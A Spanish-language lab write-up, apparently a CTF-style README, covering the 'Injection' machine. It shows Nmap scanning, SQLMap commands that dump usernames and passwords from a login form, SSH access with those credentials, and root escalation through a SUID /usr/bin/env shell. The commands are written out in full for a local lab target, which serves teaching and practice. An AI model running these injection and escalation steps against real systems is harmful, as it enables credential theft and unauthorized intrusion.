# 💉 Injection

Este proyecto documenta un ejercicio de hacking ético centrado en el reconocimiento, explotación y escalada de privilegios en una máquina virtual.

## ⚙️ Herramientas utilizadas

- [Nmap](https://nmap.org/) – Escaneo de puertos y detección de servicios
- [SQLMap](https://sqlmap.org/) – Automatización de ataques por inyección SQL

---

## 🔍 Escaneo de Puertos

Realizamos un escaneo exhaustivo de puertos con Nmap:

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv 172.17.0.2 -oN escaneo.txt
```
### Parámetros clave:

- sudo: Necesario para escaneos con privilegios elevados.

- -p-: Escanea todos los puertos (1-65535).

- -sS: Escaneo SYN (sigiloso).

- -sC: Usa scripts por defecto.

- -sV: Detecta versiones de servicios.

- --min-rate 5000: Aumenta velocidad de escaneo.

- -n: Omite resolución DNS.

- -Pn: Omite ping previo.

- -vvv: Máximo detalle en la salida.

- -oN escaneo.txt: Guarda salida en archivo legible.

<img width="564" alt="image" src="https://github.com/user-attachments/assets/0d9d8c3c-954d-4300-b322-e98488464510" /><br>

---

## 🌐 Servidor HTTP en Puerto 80
El escaneo revela un servidor web activo. Accedemos y encontramos un panel de login.

<img width="544" alt="image" src="https://github.com/user-attachments/assets/fb7dbc3e-aa49-41e4-b7d4-5c8ed9697070" /><br>

---

## 💥 Explotación con SQLMap
1. Enumerar bases de datos:
```bash
sqlmap -u http://172.17.0.2/ --forms --dbs --batch
```

![image](https://github.com/user-attachments/assets/b2707222-657b-4705-aa77-ca1b2709f1bd)<br>

2. Enumerar tablas de la base register:
```bash
sqlmap -u http://172.17.0.2/ --forms -D register --tables --batch
```

<img width="515" alt="image" src="https://github.com/user-attachments/assets/cdb68eb8-948e-4266-8371-3314992f7a33" /><br>

3. Ver columnas de la tabla users:
```bash
sqlmap -u http://172.17.0.2/ --forms -D register -T users --columns --batch
```

<img width="521" alt="image" src="https://github.com/user-attachments/assets/5d4081aa-711a-4194-b273-e5df01b2e37f" /><br>

4. Obtener datos de usuarios:
```bash
sqlmap -u http://172.17.0.2/ --forms -D register -T users -C username,passwd --dump --batch
```

<img width="535" alt="image" src="https://github.com/user-attachments/assets/88c47b8b-9df8-4a4c-9827-105f1c7bd938" /><br>

---

## 🔐 Acceso vía SSH
Con las credenciales obtenidas, accedemos vía SSH al sistema comprometido.

<img width="559" alt="image" src="https://github.com/user-attachments/assets/8ac16246-5b47-4a89-bbad-86a2b6e5f590" /><br>

---

## 🛡️ Escalada de Privilegios
1. Verificar permisos sudo:
```bash
sudo -l
```

<img width="540" alt="image" src="https://github.com/user-attachments/assets/48d48ef9-1fe0-4997-a319-d63cbdcc1833" /><br>

(No se obtuvo acceso directo a sudo).

2. Buscar binarios SUID:
```bash
find / -perm -4000 2>/dev/null
```

<img width="565" alt="image" src="https://github.com/user-attachments/assets/f958b6b6-1585-4fd0-8dfa-0174513acace" /><br>

Identificamos /usr/bin/env como binario potencialmente explotable.

3. Explotación con GTFObins:

<img width="559" alt="image" src="https://github.com/user-attachments/assets/f0e6e75a-3746-42a2-949f-f42493b08952" /><br>

```bash
/usr/bin/env /bin/sh -p
```

<img width="562" alt="image" src="https://github.com/user-attachments/assets/f140fdf8-2fe0-4e8f-bdc9-8b51ce1171b2" /><br>

🎉 Escalada de privilegios completada con éxito.

---

## 📁 Resultados
- Acceso a servidor web y explotación de SQLi.
- Dump de credenciales desde base de datos.
- Acceso por SSH a máquina víctima.
- Escalada de privilegios mediante binario SUID.
